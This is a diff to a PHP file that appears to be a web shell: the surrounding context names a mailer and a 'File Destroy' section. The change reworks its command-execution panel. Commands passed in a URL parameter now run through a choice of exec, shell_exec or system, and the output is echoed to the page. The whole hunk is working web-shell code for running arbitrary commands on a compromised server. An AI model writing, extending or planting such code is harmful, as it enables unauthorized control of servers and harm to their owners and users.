@@ -131,11 +131,34 @@ echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><
 
 <!--//Command-->
 <?php
-if(isset($_GET['cmd'])){
-    echo "<font>Command Line</font><br><br><form><input type='text' name='cmd' /><input type='submit'value='Exec' /></form>";
-        echo "<br><pre>";
-        echo @system($_GET['cmd']);
-        echo "</font></pre>";}
+if(isset($_GET['cmd']))
+{
+  echo "<form method='GET' action='?gox'>
+  <select name='cmd'>
+  <option value='exc'>Exec</option>
+  <option value='sexc'>Shell_exec</option>
+  <option value='stm'>System</option>
+  </select>
+  <input type='text' name='com'>
+  <input type='submit' name='gox' value='Execute'>
+  </form><script>";
+  if($_GET['gox'])
+  {
+    echo "</script>";
+    echo "<br><pre>";
+    $mtd = $_GET['cmd'];
+    if($mtd === "exc"){
+      echo @exec($_GET['com']);
+    }elseif($mtd === "sexc"){
+      echo @shell_exec($_GET['com']);
+    }elseif($mtd === "stm"){
+      echo @system($_GET['com']);
+    }
+    echo "</font></pre>";
+  }else{
+    echo "Function Disable!";
+  }
+}
 ?>
 
 <!--//File Destroy-->
